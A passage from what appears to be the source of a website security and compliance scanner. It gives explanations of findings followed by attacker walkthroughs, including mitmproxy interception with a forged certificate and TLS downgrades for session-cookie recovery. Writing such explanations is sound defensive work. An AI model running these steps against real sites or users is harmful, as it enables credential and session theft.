    whoCanAct: 'Any visitor inspecting network traffic, and a regulator.',
    impact: 'Device storage and reads happen pre-consent — the exact thing ePrivacy forbids.',
    worstCase: 'An ePrivacy Art. 5(3) + GDPR breach, demonstrated with a single HAR file.',
  },
  'eu-third-party-cookie': {
    whatItIs: 'Cookies are set on domains you do not own.',
    whoCanAct: 'The third party receiving the data, and a regulator.',
    impact: 'Data flows to third parties / third countries without a documented basis.',
    worstCase: 'A GDPR Art. 44 breach — unlawful international transfer.',
  },
  'eu-ai-act-disclosure': {
    whatItIs: 'An AI system is in use without a user-facing AI disclosure.',
    whoCanAct: 'A regulator or market-surveillance authority.',
    impact: 'Users interact with AI without being told, and generated content is not marked.',
    worstCase: 'An EU AI Act (2024/1689) Art. 50 transparency breach; fines up to 3% of turnover.',
  },
  'eu-dsa-trader-info': {
    whatItIs: 'An online-sales page omits the required DSA trader information.',
    whoCanAct: 'A DSA enforcement authority.',
    impact: 'Consumers cannot verify who they are buying from.',
    worstCase: 'A DSA (2022/2065) Art. 30-31 breach — trading restrictions and fines.',
  },
  'eu-data-transfer': {
    whatItIs: 'Third-party infrastructure implies data leaving your control, possibly the EU.',
    whoCanAct: 'A regulator; attackers who may reach the third party.',
    impact: 'No DPA or SCC chain is documented for the sub-processor.',
    worstCase: 'A GDPR Chapter V breach — an unlawful transfer and a reportable incident.',
  },
  'eu-cookie-no-reject-button': {
    whatItIs: 'The cookie banner does not offer an equal single-click "Reject All" button on the first layer.',
    whoCanAct: 'A data protection authority, consumer protection agency, or any user.',
    impact: 'Users are nudged into accepting cookies because rejecting requires opening multi-layer settings (dark pattern).',
    worstCase: 'GDPR Art. 4(11) & Art. 7(3) violation under EDPB Cookie Banner Taskforce guidelines; regulatory enforcement orders and fines.',
  },
  'eu-preticked-consent': {
    whatItIs: 'A consent or newsletter subscription checkbox defaults to checked.',
    whoCanAct: 'A data protection authority or user making a GDPR complaint.',
    impact: 'Consent obtained via pre-ticked boxes is legally null and void under EU law.',
    worstCase: 'GDPR Art. 4(11) & CJEU Planet49 (C-673/17) breach; invalid consent invalidates all downstream marketing processing.',
  },
  'us-gpc-optout': {
    whatItIs: 'Trackers run without a US "Do Not Sell or Share" link or Global Privacy Control (GPC) opt-out mechanism.',
    whoCanAct: 'State Attorneys General (California CPPA, Texas AG, Colorado, Connecticut).',
    impact: 'US consumers cannot exercise their statutory right to opt out of cross-context behavioral advertising.',
    worstCase: 'Civil penalties under CCPA/CPRA ($2,500 to $7,500 per violation) and state regulatory enforcement sweeps.',
  },
  'privacy-session-replay': {
    whatItIs: 'Session replay software records user keystrokes and interactions without prior consent or wiretapping notice.',
    whoCanAct: 'Class-action plaintiffs\' attorneys and data protection regulators.',
    impact: 'Real-time DOM and keystroke capture without prior consent constitutes unlawful digital wiretapping.',
    worstCase: 'Statutory damages under California Invasion of Privacy Act (CIPA § 631) of $5,000 per violation, plus GDPR Article 82 claims.',
  },

  /* ---- active / probe findings ---- */
  'open-redirect': {
    whatItIs: 'A URL parameter controls where the server redirects the browser.',
    whoCanAct: 'Anyone who can send a crafted link — phishing is the usual route.',
    impact: 'Attackers hide a malicious destination behind your trusted domain.',
    worstCase: 'Credential phishing that bypasses link scanners, plus OAuth token theft.',
  },
  'reflected-input': {
    whatItIs: 'A request parameter is echoed into the response body.',
    whoCanAct: 'Anyone who can craft a URL or POST against the site.',
    impact: 'With no output encoding this is reflected XSS — a foothold in every visitor session.',
    worstCase: 'Session theft, keylogging, CSRF-token harvest and account takeover.',
  },
  'reflected-input-escaped': {
    whatItIs: 'A parameter is echoed but HTML-escaped, so no injection was demonstrated.',
    whoCanAct: 'Anyone who can craft the request.',
    impact: 'Input reflection is still a sink — one bypass reopens XSS.',
    worstCase: 'Reflected XSS if any context is missed (inside <script> or an attribute).',
  },
  'host-header-injection': {
    whatItIs: 'The server echoes the client-supplied Host header into responses.',
    whoCanAct: 'Anyone who can send a request with a forged Host.',
    impact: 'Poisoned password-reset links, cache poisoning and SSRF against internal vhosts.',
    worstCase: 'Reset-token theft leading to full account takeover.',
  },
  'http-methods': {
    whatItIs: 'Write or debug HTTP methods (PUT/DELETE/TRACE/TRACK) are enabled.',
    whoCanAct: 'Any unauthenticated client that can reach the server.',
    impact: 'PUT/DELETE can overwrite files; TRACE reflects cookies past HttpOnly (cross-site tracing).',
    worstCase: 'Defacement or data destruction, or session theft via cross-site tracing.',
  },
  'dir-listing': {
    whatItIs: 'Directory autoindexing is enabled on one or more paths.',
    whoCanAct: 'Anyone who can browse the path.',
    impact: 'Backups, drafts, uploads and source maps become enumerable.',
    worstCase: 'Mass personal-data exposure (a breach) plus source and config disclosure.',
  },
  'crossdomain-policy': {
    whatItIs: 'Legacy Flash/Silverlight cross-domain policy files are published.',
    whoCanAct: 'Any website the victim visits — the file grants cross-origin access.',
    impact: 'A wildcard entry let any origin read authenticated responses.',
    worstCase: 'Cross-origin data theft with zero benefit, since Flash is dead.',
  },
  'graphql-introspection': {
    whatItIs: 'The GraphQL schema is fully readable via introspection.',
    whoCanAct: 'Anyone who can reach the endpoint.',
    impact: 'An attacker maps every type, field and admin mutation in one request.',
    worstCase: 'Targeted mutation abuse (account or data manipulation) once auth gaps are found.',
  },
  'api-error-verbose': {
    whatItIs: 'Error responses leak stack traces, SQL or framework signatures.',
    whoCanAct: 'Anyone who can trigger an error.',
    impact: 'Reveals framework, versions, file paths and query structure.',
    worstCase: 'Turns a generic exploit into a precise, working one.',
  },
  'bucket-public': {
    whatItIs: 'An object-storage bucket allows anonymous listing.',
    whoCanAct: 'Anyone who knows or guesses the bucket name.',
    impact: 'Every stored object (invoices, exports, database dumps) is downloadable.',
    worstCase: 'Bulk exfiltration of user data — a full, reportable breach.',
  },
  'bucket-referenced': {
    whatItIs: 'A storage bucket is referenced by the frontend but does not list anonymously.',
    whoCanAct: 'No one via listing — this is the correct configuration.',
    impact: 'Informational: confirms your storage provider and the surrounding attack surface.',
    worstCase: 'None while public-access-block stays on; rotate app credentials on a schedule.',
  },
  'ws-insecure': {
    whatItIs: 'A WebSocket is opened over ws:// (unencrypted).',
    whoCanAct: 'Anyone on the same network path (public Wi-Fi, rogue AP, ARP spoof).',
    impact: 'Message streams — including tokens and chat — are readable and injectable.',
    worstCase: 'Session and token theft plus full manipulation of the realtime channel.',
  },
  'ws-endpoints': {
    whatItIs: 'WebSocket endpoints were discovered and fingerprinted.',
    whoCanAct: 'Anyone who can open a socket to the endpoint.',
    impact: 'Realtime channels are stateful and per-message authorization is easy to miss.',
    worstCase: 'Broken object-level authorization — reading other users channels.',
  },
  'sri-missing': {
    whatItIs: 'Third-party scripts or styles load without Subresource Integrity.',
    whoCanAct: 'The CDN, or anyone who compromises it or hijacks its DNS.',
    impact: 'The browser runs whatever the CDN returns, on every load.',
    worstCase: 'Arbitrary JS in your origin — full DOM, cookie and network access (supply-chain XSS).',
  },
  'third-party-surface': {
    whatItIs: 'The page loads scripts from several distinct third-party hosts.',
    whoCanAct: 'Each host is a party you do not control.',
    impact: 'Availability, privacy (GDPR transfer) and extra DNS/TLS latency.',
    worstCase: 'A single dead or breached host breaks or compromises the whole page.',
  },
  'pii-exposure': {
    whatItIs: 'Personal or financial data (IBANs, card-shaped numbers) is embedded in the source.',
    whoCanAct: 'Anyone who views the source or downloads the JS bundle.',
    impact: 'An exfiltration-grade leak of personal data sitting in plain view.',
    worstCase: 'A GDPR Art. 33/34 breach — mandatory notification, fines and fraud.',
  },
  'pii-iban': {
    whatItIs: 'IBAN-shaped values are exposed in the page source.',
    whoCanAct: 'Anyone who reads the HTML or the JS bundle.',
    impact: 'A name plus an IBAN is enough to attempt a SEPA direct debit.',
    worstCase: 'Payment fraud and a GDPR Art. 34 breach-notification event.',
  },
  'public-company-trr': {
    whatItIs: 'A verified corporate bank account (TRR/IBAN) is displayed on the page.',
    whoCanAct: 'Customers and partners initiating bank wire / UPN payments.',
    impact: 'Customary EU business practice for invoicing and direct bank transfers.',
    worstCase: 'None — under GDPR Recital 14, legal entity data is not personal data.',
  },

  /* ---- Shodan InternetDB findings ---- */
  'shodan-exposed-db': {
    whatItIs: 'A database or cache service port (e.g. MySQL, PostgreSQL, Redis, MongoDB, Elasticsearch, Memcached, MSSQL) is directly reachable from the public internet.',
    whoCanAct: 'Anyone on the public internet — automated vulnerability scanners, botnets, and attackers.',
    impact: 'Attackers can attempt brute-force authentication, exploit unauthenticated configurations (e.g. default Redis or MongoDB), or leverage known database CVEs.',
    worstCase: 'Complete database compromise, data exfiltration, ransomware encryption, or total database wipe.',
  },
  'shodan-exposed-remote-mgmt': {
    whatItIs: 'Unencrypted or graphical remote administration services (RDP, VNC, Telnet) are exposed directly to the public internet.',
    whoCanAct: 'Any remote attacker scanning the internet for accessible administrative interfaces.',
    impact: 'Exposes administrative login prompts to credential stuffing, password brute-forcing, and known remote code execution vulnerabilities.',
    worstCase: 'Full server takeover via interactive graphical desktop or root administrative shell.',
  },
  'shodan-known-cve': {
    whatItIs: 'Public security databases (Shodan InternetDB / NIST NVD) index known, unpatched CVE vulnerabilities on services running on this host IP.',
    whoCanAct: 'Attackers using automated vulnerability scanners or public exploit databases (Exploit-DB, Metasploit).',
    impact: 'Known vulnerabilities have published proof-of-concept exploits that attackers can fire against the server without prior reconnaissance.',
    worstCase: 'Remote code execution, service denial of service, privilege escalation, or unauthorized data access.',
  },
  'shodan-ssh-open': {
    whatItIs: 'The SSH remote administration service (port 22) is open and reachable on the host public IP address.',
    whoCanAct: 'Anyone on the internet who can send TCP traffic to port 22.',
    impact: 'Exposes SSH to constant automated dictionary scans and brute-force botnets.',
    worstCase: 'If password authentication is permitted or weak keys are used, an attacker gains shell access.',
  },

  /* ---- Google CrUX field data findings ---- */
  'crux-field-fast': {
    whatItIs: 'Real-world Chrome user experience data from the Google Chrome UX Report (CrUX) confirms fast page loads and smooth interactivity.',
    whoCanAct: 'Website engineering and performance optimization team.',
    impact: 'Provides positive ranking signals for Google Search Core Web Vitals and delivers a fast, low-bounce user experience.',
    worstCase: 'Performance regressions if unoptimized third-party scripts or uncompressed media are added.',
  },
  'crux-field-slow': {
    whatItIs: 'Aggregated 28-day field data from real Google Chrome users (CrUX) categorizes this website as SLOW.',
    whoCanAct: 'Google Search algorithm (ranking demotion) and real visitors experiencing lag.',
    impact: 'Failing Core Web Vitals directly damages organic Google Search rankings and drives up user bounce rates.',
    worstCase: 'Significant loss of organic search traffic, poor conversion rates, and frustrated mobile users.',
  },

  /* ---- Certificate Transparency reconnaissance findings ---- */
  'ct-exposed-staging': {
    whatItIs: 'Public Certificate Transparency logs contain issued SSL certificates for test or development environments.',
    whoCanAct: 'Attackers inspecting public Certificate Transparency (CT) logs.',
    impact: 'Exposes unhardened code, debug endpoints, or legacy software to reconnaissance.',
    worstCase: 'Attacker accesses staging database or exploits development credentials to breach production.',
  },

  /* ---- SEO ---- */
  'seo-title': {
    whatItIs: 'The page has no <title> tag.',
    whoCanAct: 'No attacker — search engines and users lose the page identity.',
    impact: 'Search snippets are generated arbitrarily and clicks drop.',
    worstCase: 'The page ranks for the wrong query or is never clicked.',
  },
  'seo-title-len': {
    whatItIs: 'The <title> length falls outside the 15-65 character window.',
    whoCanAct: 'No attacker — this is a SERP truncation and ranking issue.',
    impact: 'Titles get cut off in results or look thin.',
    worstCase: 'Lower click-through and wasted keyword targeting.',
  },
  'seo-desc': {
    whatItIs: 'There is no meta description.',
    whoCanAct: 'No attacker — snippet quality degrades.',
    impact: 'Search engines invent a snippet from page text.',
    worstCase: 'Uncontrolled, less persuasive search snippets.',
  },
  'seo-desc-len': {
    whatItIs: 'The meta description is outside the 120-160 character window.',
    whoCanAct: 'No attacker — snippet truncation.',
    impact: 'The call to action is cut off in results.',
    worstCase: 'Weaker click-through than a well-sized description.',
  },
  'seo-canonical': {
    whatItIs: 'No canonical link is declared.',
    whoCanAct: 'No attacker — duplicate-content signals split ranking.',
    impact: 'Multiple URLs compete for the same content.',
    worstCase: 'Ranking dilution and inconsistent indexing.',
  },
  'seo-viewport': {
    whatItIs: 'There is no viewport meta tag.',
    whoCanAct: 'No attacker — mobile rendering breaks.',
    impact: 'The page does not scale on phones, so text is tiny.',
    worstCase: 'A mobile usability failure and a mobile-first ranking penalty.',
  },
  'seo-lang': {
    whatItIs: 'The <html> element has no lang attribute.',
    whoCanAct: 'No attacker — hreflang and pronunciation signals are lost.',
    impact: 'Search engines and screen readers cannot confirm the page language.',
    worstCase: 'Wrong-locale indexing and an accessibility failure.',
  },
  'seo-h1': {
    whatItIs: 'The page has no <h1>.',
    whoCanAct: 'No attacker — topical relevance is weakened.',
    impact: 'There is no primary keyword signal for the page.',
    worstCase: 'Lower relevance for the page core topic.',
  },
  'seo-h1-multi': {
    whatItIs: 'The page has several <h1> headings.',
    whoCanAct: 'No attacker — diluted topical focus.',
    impact: 'Keyword intent is split across headings.',
    worstCase: 'An unclear page topic for crawlers.',
  },
  'seo-og': {
    whatItIs: 'There are no Open Graph tags.',
    whoCanAct: 'No attacker — social sharing degrades.',
    impact: 'Links render as bare URLs on social platforms and in chat.',
    worstCase: 'Lower social click-through and unbranded previews.',
  },
  'seo-jsonld': {
    whatItIs: 'There is no schema.org JSON-LD structured data.',
    whoCanAct: 'No attacker — rich results are unavailable.',
    impact: 'No FAQ, breadcrumb or organization rich snippets.',
    worstCase: 'Fewer SERP features and lower visibility.',
  },
  'seo-status': {
    whatItIs: 'The page did not return HTTP 200.',
    whoCanAct: 'No attacker — a crawl and indexing problem.',
    impact: 'A non-200 status harms indexing and user trust.',
    worstCase: 'The page is dropped from the index.',
  },
  'seo-structured-data': {
    whatItIs: 'No JSON-LD structured data is present.',
    whoCanAct: 'No attacker — rich-result eligibility is lost.',
    impact: 'Search engines cannot build entity or rich snippets.',
    worstCase: 'Fewer SERP enhancements and lower click-through.',
  },
  'seo-structured-data-invalid': {
    whatItIs: 'One or more JSON-LD blocks do not parse.',
    whoCanAct: 'No attacker — the structured data is simply ignored.',
    impact: 'Malformed JSON is silently discarded by crawlers.',
    worstCase: 'No rich results despite the effort of adding markup.',
  },
  'seo-structured-data-incomplete': {
    whatItIs: 'Structured-data types are missing required properties.',
    whoCanAct: 'No attacker — the markup is ineligible.',
    impact: 'Search engines reject incomplete entities.',
    worstCase: 'Rich results never appear.',
  },
  'seo-structured-data-base': {
    whatItIs: 'No Organization or WebSite entity is declared.',
    whoCanAct: 'No attacker — brand-entity signals are weak.',
    impact: 'Knowledge-panel and sitelinks eligibility is reduced.',
    worstCase: 'A weaker brand presence in search.',
  },
  'seo-llms-txt': {
    whatItIs: 'No /llms.txt file is published.',
    whoCanAct: 'No attacker — AI crawlers lack guidance.',
    impact: 'AI assistants cannot find your preferred machine-readable summary.',
    worstCase: 'Your content is quoted without the framing you want.',
  },
  'seo-llms-txt-h1': {
    whatItIs: 'The /llms.txt file is missing an H1 title.',
    whoCanAct: 'No attacker — AI crawlers and PageSpeed Insights lack the primary project entity.',
    impact: 'Google PageSpeed Insights and AI crawlers cannot identify the canonical project name.',
    worstCase: 'AI agents fail to associate llms.txt content with your brand.',
  },
  'seo-llms-txt-links': {
    whatItIs: 'The /llms.txt file does not use standard Markdown link format [Title](url).',
    whoCanAct: 'No attacker — AI crawlers and PageSpeed Insights cannot parse links.',
    impact: 'Google PageSpeed Insights Agentic Browsing fails and LLM crawlers cannot index linked pages.',
    worstCase: 'AI models fail to traverse your site pages and reference obsolete data.',
  },
  'seo-ai-crawler-policy': {
    whatItIs: 'robots.txt does not state a policy for AI crawlers.',
    whoCanAct: 'AI crawlers such as GPTBot, ClaudeBot and Google-Extended.',
    impact: 'Content is scraped with no opt-in or opt-out signal.',
    worstCase: 'Your content trains models or appears in AI answers without attribution.',
  },
  'seo-ai-content-scraped': {
    whatItIs: 'Content is open to a number of known AI crawlers.',
    whoCanAct: 'Every listed AI crawler.',
    impact: 'Content may be ingested for training or AI answers.',
    worstCase: 'Competitive content reuse with no click-through back to you.',
  },
  'seo-noindex': {
    whatItIs: 'The page is marked noindex.',
    whoCanAct: 'No attacker — it is hidden from search, deliberately or by mistake.',
    impact: 'The page will not rank.',
    worstCase: 'Accidental site-wide deindexing.',
  },
  'seo-noindex-header': {
    whatItIs: 'An X-Robots-Tag header sets noindex.',
    whoCanAct: 'No attacker — a header-level indexing block.',
    impact: 'Search engines drop the URL.',
    worstCase: 'Whole sections removed from the index by a stray header.',
  },
  'seo-canonical-cross-domain': {
    whatItIs: 'The canonical points at a different domain.',
    whoCanAct: 'No attacker — you are de-ranking yourself.',
    impact: 'Ranking signals are passed to the other domain.',
    worstCase: 'Your pages compete with, and lose to, the canonical target.',
  },
  'seo-canonical-www-mismatch': {
    whatItIs: 'The canonical URL points between apex and www on the same domain.',
    whoCanAct: 'No attacker — search indexing preference.',
    impact: 'Search engines consolidate authority to the declared canonical version.',
    worstCase: 'If redirects conflict with canonical, crawlers experience an extra redirect hop.',
  },
  'seo-hreflang-missing': {
    whatItIs: 'There are no hreflang annotations for a multi-language site.',
    whoCanAct: 'No attacker — the wrong locale may be served.',
    impact: 'Users get the wrong language in search results.',
    worstCase: 'Locale cannibalisation and lost regional traffic.',
  },
  'seo-hreflang-invalid': {
    whatItIs: 'hreflang values are malformed.',
    whoCanAct: 'No attacker — the annotations are ignored.',
    impact: 'Search engines cannot map language and region pairs.',
    worstCase: 'All hreflang signals are discarded.',
  },
  'seo-hreflang-xdefault': {
    whatItIs: 'The hreflang set has no x-default entry.',
    whoCanAct: 'No attacker — no fallback locale is declared.',
    impact: 'Unmatched users get an arbitrary locale.',
    worstCase: 'Wrong-language pages served to users worldwide.',
  },
  'seo-social-image': {
    whatItIs: 'There is no dedicated social-share (Open Graph) image.',
    whoCanAct: 'No attacker — previews are unbranded.',
    impact: 'Links share as plain text.',
    worstCase: 'Lower engagement on every share.',
  },
  'seo-twitter-card': {
    whatItIs: 'There is no Twitter/X card metadata.',
    whoCanAct: 'No attacker — previews are degraded.',
    impact: 'Posts show a bare link.',
    worstCase: 'Lower share click-through.',
  },
  'seo-robots': {
    whatItIs: 'robots.txt is missing or unreadable.',
    whoCanAct: 'No attacker — crawler guidance is gone.',
    impact: 'Crawlers choose for themselves which paths to index.',
    worstCase: 'Sensitive or staging paths get indexed.',
  },
  'seo-robots-block': {
    whatItIs: 'robots.txt blocks paths you likely want indexed.',
    whoCanAct: 'No attacker — a self-inflicted visibility block.',
    impact: 'Those URLs will not rank.',
    worstCase: 'Lost organic traffic for key pages.',
  },
  'seo-sitemap': {
    whatItIs: 'No XML sitemap was found.',
    whoCanAct: 'No attacker — discovery is slower and incomplete.',
    impact: 'New pages are indexed late or not at all.',
    worstCase: 'Missed indexing for important content.',
  },

  /* ---- performance & asset hygiene ---- */
  'perf-longtasks': {
    whatItIs: 'Long main-thread tasks were measured during load.',
    whoCanAct: 'No attacker — input responsiveness suffers.',
    impact: 'Taps and clicks feel delayed; INP degrades.',
    worstCase: 'Measurable conversion loss on mobile.',
  },
  'perf-transfer': {
    whatItIs: 'The page transfers more bytes than it should.',
    whoCanAct: 'No attacker — every user pays the cost.',
    impact: 'Slower load on mobile networks and higher data usage.',
    worstCase: 'Poor Core Web Vitals and lower ranking.',
  },
  'perf-failed-requests': {
    whatItIs: 'Requests failed during page load.',
    whoCanAct: 'No attacker — broken assets or fetches.',
    impact: 'Missing images and scripts, plus wasted round-trips.',
    worstCase: 'Silent breakage of features in production.',
  },
  'perf-network-errors': {
    whatItIs: 'Network-level errors occurred while loading.',
    whoCanAct: 'No attacker, but intermittent infrastructure trouble.',
    impact: 'Resource failures degrade the page.',
    worstCase: 'Flaky UX and hidden outages.',
  },
  'page-weight': {
    whatItIs: 'The page is heavy in transferred bytes.',
    whoCanAct: 'No attacker — a pure performance cost.',
    impact: 'Slow load on mobile; higher bounce rate.',
    worstCase: 'Failing Core Web Vitals and a ranking penalty.',
  },
  'render-blocking': {
    whatItIs: 'Blocking CSS or JS delays first paint and interactivity.',
    whoCanAct: 'No attacker — a pure performance cost.',
    impact: 'Higher LCP and INP.',
    worstCase: 'Measurable revenue loss from a slow first interaction.',
  },
  'inline-scripts': {
    whatItIs: 'The page contains inline <script> blocks.',
    whoCanAct: 'An XSS injection gains a nonce-free execution context.',
    impact: 'Inline scripts block a strict CSP (no nonce or hash) and add parse cost.',
    worstCase: 'CSP cannot be hardened, leaving XSS easier to exploit.',
  },
  'no-compression': {
    whatItIs: 'Responses are not gzip or brotli compressed.',
    whoCanAct: 'No attacker — bandwidth waste.',
    impact: 'HTML, JS and CSS ship larger than necessary.',
    worstCase: 'Slower load and higher CDN egress cost.',
  },
  'no-cache': {
    whatItIs: 'No caching headers are set.',
    whoCanAct: 'No attacker — repeat loads are slow.',
    impact: 'Browsers and CDNs cannot cache, so every visit re-downloads.',
    worstCase: 'Poor repeat-visit performance and wasted origin load.',
  },
  'img-format': {
    whatItIs: 'Images are served as legacy PNG/JPEG/GIF.',
    whoCanAct: 'No attacker — heavier payloads.',
    impact: 'Images are 30-60% larger than WebP or AVIF equivalents.',
    worstCase: 'Slower LCP on image-heavy pages.',
  },
  'http-redirect': {
    whatItIs: 'Multiple redirects occur before the final page.',
    whoCanAct: 'No attacker — extra round-trips.',
    impact: 'Each hop adds latency before render.',
    worstCase: 'Slower load and diluted link equity.',
  },
  'deprecated': {
    whatItIs: 'Deprecated web-platform features are in use.',
    whoCanAct: 'No attacker directly — dead or fragile tech.',
    impact: 'Features may break as browsers remove support.',
    worstCase: 'Sudden breakage with no replacement in place.',
  },
  'dns-dnssec': {
    whatItIs: 'DNSSEC is not enabled for the domain.',
    whoCanAct: 'A network or DNS attacker able to spoof responses.',
    impact: 'DNS answers are not cryptographically verified.',
    worstCase: 'Cache poisoning or DNS spoofing redirects users to an attacker host.',
  },
  'no-security-txt': {
    whatItIs: 'No /.well-known/security.txt is published.',
    whoCanAct: 'No attacker — a coordination gap.',
    impact: 'Researchers cannot find your disclosure contact.',
    worstCase: 'Vulnerabilities are sold or publicised instead of reported privately.',
  },
  'trackers': {
    whatItIs: 'Third-party trackers were detected on the page.',
    whoCanAct: 'The tracker vendors and any regulator.',
    impact: 'User behaviour is collected; a consent and lawful basis must exist.',
    worstCase: 'A GDPR/ePrivacy breach if loaded without consent.',
  },
  'no-consent': {
    whatItIs: 'Trackers load with no consent banner detected.',
    whoCanAct: 'A regulator and any privacy-aware user.',
    impact: 'Non-essential cookies and identifiers are set pre-consent.',
    worstCase: 'An ePrivacy Art. 5(3) + GDPR breach — fines and forced remediation.',
  },
  'consent-present': {
    whatItIs: 'A consent mechanism was detected alongside trackers.',
    whoCanAct: 'No direct attacker — this is informational.',
    impact: 'Confirms a CMP is present; verify it truly blocks pre-consent.',
    worstCase: 'A cosmetic banner that grants by default still breaches the rules.',
  },
  'data-residency': {
    whatItIs: 'Third-party infrastructure suggests data may leave your control.',
    whoCanAct: 'The third-party sub-processor and a regulator.',
    impact: 'A potential non-EU transfer without documented safeguards.',
    worstCase: 'A GDPR Chapter V breach and a reportable transfer incident.',
  },
  'hdr-': {
    whatItIs: 'A recommended security response header is missing.',
    whoCanAct: 'Browser-side attackers who exploit the missing control.',
    impact: 'The specific protection (framing, MIME-sniffing, referrer, permissions) is absent.',
    worstCase: 'Chained with other findings into clickjacking, XSS or data leakage.',
  },
  'hdr-x-content-type-options': {
    whatItIs: 'The X-Content-Type-Options: nosniff header is missing.',
    whoCanAct: 'Any attacker who can get a file served with the wrong MIME type.',
    impact: 'Browsers may sniff and execute an uploaded file as HTML/script.',
    worstCase: 'Stored XSS from an uploaded image or text file the browser reinterprets.',
  },
  'hdr-x-frame-options': {
    whatItIs: 'Neither X-Frame-Options nor CSP frame-ancestors blocks framing.',
    whoCanAct: 'Any site that embeds your pages in an iframe.',
    impact: 'Clickjacking: invisible overlays trick users into clicking real controls.',
    worstCase: 'Silent account actions, purchases or data changes by a deceived user.',
  },
  'hdr-referrer-policy': {
    whatItIs: 'No Referrer-Policy is set.',
    whoCanAct: 'Third-party sites and analytics that receive your referral data.',
    impact: 'Full URLs — including tokens in query strings — leak to external sites.',
    worstCase: 'Session or reset tokens exposed through the Referer header.',
  },
  'hdr-permissions-policy': {
    whatItIs: 'No Permissions-Policy is set.',
    whoCanAct: 'Embedded third-party scripts and iframes.',
    impact: 'Powerful APIs (camera, mic, geolocation) are not restricted.',
    worstCase: 'A compromised third party silently prompts for or uses device permissions.',
  },
  'hdr-permissions-policy-overgrant': {
    whatItIs: 'A Permissions-Policy is set but grants one or more powerful features to every origin (`feature=*`).',
    whoCanAct: 'Any third-party page or iframe you embed, or anyone who embeds you.',
    impact: 'The policy advertises that camera, mic, geolocation, USB, etc. are available without restriction — the header protects nothing.',
    worstCase: 'A malicious embedder triggers device permissions or reads sensitive APIs under your origin’s trust.',
  },
  'policy-': {
    whatItIs: 'A required policy page (privacy, cookie, terms or imprint) was not found.',
    whoCanAct: 'A regulator; no attacker needed.',
    impact: 'Users cannot see how their data is handled.',
    worstCase: 'A GDPR Art. 12-14 transparency breach and DPA complaints.',
  },
  'policy-privacy-policy': {
    whatItIs: 'No privacy-policy link was found.',
    whoCanAct: 'A data-protection authority; no attacker needed.',
    impact: 'Users cannot learn what personal data you process or why.',
    worstCase: 'A GDPR Art. 12-14 transparency breach and DPA complaints.',
  },
  'policy-cookie-policy': {
    whatItIs: 'No cookie-policy link was found.',
    whoCanAct: 'A regulator; no attacker needed.',
    impact: 'Users cannot see which cookies are set and their purpose.',
    worstCase: 'An ePrivacy / GDPR transparency breach.',
  },
  'policy-terms': {
    whatItIs: 'No terms-of-service link was found.',
    whoCanAct: 'A consumer-protection authority; no attacker needed.',
    impact: 'No contractual ground rules or liability terms are published.',
    worstCase: 'Consumer-law exposure and disputes with no agreed terms.',
  },
  'policy-imprint-company-info': {
    whatItIs: 'No imprint / company-information page was found.',
    whoCanAct: 'A regulator; no attacker needed.',
    impact: 'Users cannot identify or contact the operator.',
    worstCase: 'A legal-notice (imprint) compliance failure in the EU.',
  },
  'csp-unsafe-inline': {
    whatItIs: 'The Content-Security-Policy allows inline scripts and styles (unsafe-inline).',
    whoCanAct: 'Anyone who can get text into the page: profile fields, comments, a CMS widget, a compromised third-party script.',
    impact: 'An injected inline script runs with full access to the page and its cookies.',
    worstCase: 'XSS that steals the session, keys and payment-form data of every visitor.',
  },
  'csp-unsafe-eval': {
    whatItIs: 'The Content-Security-Policy allows eval() (unsafe-eval).',
    whoCanAct: 'An attacker who can influence data that reaches a string-evaluating path (JSON.parse polyfill, template engine, library sink).',
    impact: 'Strings can be executed as code, so a data-only bug turns into code execution.',
    worstCase: 'Remote code execution in the browser context, with the visitor\'s session.',
  },
  'cors-credential-leak': {
    whatItIs: 'CORS reflects an arbitrary Origin while allowing credentials (cookies).',
    whoCanAct: 'Any site on the internet the victim visits, with no prior access to yours.',
    impact: 'The attacker\'s page reads authenticated responses from your API as the victim.',
    worstCase: 'Account takeover: profile, email, invoices and any other authenticated data are exfiltrated.',
  },
  'sourcemap-exposed': {
    whatItIs: 'Production JavaScript source maps (.map) are publicly downloadable.',
    whoCanAct: 'Anyone — the files are public.',
    impact: 'Original source, comments, internal URLs and sometimes hard-coded keys and API endpoints are recoverable.',
    worstCase: 'The attacker reads internal logic and credentials, then targets endpoints that were never meant to be public.',
  },
  'debug-endpoints-exposed': {
    whatItIs: 'A debug or development endpoint (/debug, /actuator, /graphql playground, ...) answers on the public site.',
    whoCanAct: 'Anyone who can reach the site.',
    impact: 'Internal configuration, environment data or privileged operations are exposed without auth.',
    worstCase: 'Environment secrets or admin operations are readable and callable by anyone on the internet.',
  },
};

/* ------------------------------------------------------------------ *
 * Exploit walkthrough layer.
 * For every finding type, the exact sequence an attacker runs to turn
 * the weakness into impact. No redaction — VibeScan is a local,
 * single-operator tool, so evidence and commands are shown in full.
 * ------------------------------------------------------------------ */

const EXPLOIT = {
  'waf-challenge-intercepted': [
    'N/A to an attacker — this means the site’s WAF or bot protection actively challenged our crawler.',
    'An unauthenticated automated client requests the page without solving the JavaScript challenge.',
    'The edge returns an interstitial challenge page (often HTTP 403/429 or bot challenge markup).',
    'Public crawlers are blocked from reading body markup unless exempted or running a trusted browser session.',
  ],
  'eu-cookie-excessive-duration': [
    'N/A to a classic exploit — this is a GDPR / ePrivacy data-minimisation compliance issue.',
    'Inspect `Set-Cookie` headers in browser DevTools or `curl -I` for `Max-Age > 34164000` (13 months).',
    'Long-lived analytics/tracking cookies retain user identifiers across years without renewed consent.',
    'DPA audits can cite the raw `Set-Cookie` header directly as objective evidence of over-retention.',
  ],
  'seo-private-noindex': [
    'N/A to an attacker — this is an informational check confirming an intentional noindex + Disallow configuration.',
    'Check `/robots.txt` (`Disallow: /`) and `<meta name="robots" content="noindex">` or `X-Robots-Tag`.',
    'Search crawlers skip indexing, and VibeScan suppresses public SEO ranking heuristics accordingly.',
    'No fix needed for private portals; only remove if this page was meant to rank publicly.',
  ],
  'tls-untrusted': [
    'Get on the same network path as a victim (public Wi-Fi, rogue AP, ARP spoof, BGP/ISP).',
    'Serve a self-signed cert for the site\'s hostname — the browser has no trusted anchor to reject it.',
    'Proxy all traffic: `mitmproxy -p 8080` with a forged cert; victim hits the site and sees the padlock warning, most click through.',
    'Harvest credentials + session cookies, then replay them against the real site.',
  ],
  'tls-expiring': [
    'Wait for/force the expiry window.',
    'Users get full-page interstitial warnings and start abandoning checkout.',
    'Browsers hard-fail after expiry — the site is effectively offline without an attacker doing anything.',
  ],
  'tls-old-protocol': [
    'Force a downgrade to the legacy protocol: `openssl s_client -connect host:443 -tls1` or `-tls1_1`.',
    'Collect captured traffic, then run a known attack for that protocol (e.g. BEAST/POODLE on TLS1.0/CBC) to recover cookie/plaintext bytes.',
    'Replay the recovered session cookie.',
  ],
